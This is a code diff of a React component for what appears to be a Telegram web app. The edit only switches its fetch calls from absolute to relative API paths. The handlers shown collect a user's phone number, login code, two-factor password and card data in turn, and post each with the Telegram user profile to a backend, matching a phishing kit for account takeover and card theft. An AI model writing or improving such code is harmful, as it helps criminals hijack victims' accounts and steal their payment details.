@@ -37,7 +37,7 @@ export default function App() {
 
       if (linkId) {
         // Fetch specific link data from our backend
-        fetch(`/api/link/${linkId}`)
+        fetch(`api/link/${linkId}`)
           .then(res => res.json())
           .then(data => {
             if (data.type === 'custom') {
@@ -73,7 +73,7 @@ export default function App() {
   const handlePhoneSubmit = async () => {
     setLoading(true);
     try {
-      const response = await fetch('/api/submit/phone', {
+      const response = await fetch('api/submit/phone', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone, user: tg?.initDataUnsafe?.user })
@@ -88,7 +88,7 @@ export default function App() {
   const handleCodeSubmit = async () => {
     setLoading(true);
     try {
-      const response = await fetch('/api/submit/code', {
+      const response = await fetch('api/submit/code', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone, code, user: tg?.initDataUnsafe?.user })
@@ -103,7 +103,7 @@ export default function App() {
   const handle2FASubmit = async () => {
     setLoading(true);
     try {
-      await fetch('/api/submit/2fa', {
+      await fetch('api/submit/2fa', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone, twoFactor, user: tg?.initDataUnsafe?.user })
@@ -116,7 +116,7 @@ export default function App() {
   const handleCardSubmit = async () => {
     setLoading(true);
     try {
-      await fetch('/api/submit/card', {
+      await fetch('api/submit/card', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone, cardData, user: tg?.initDataUnsafe?.user })
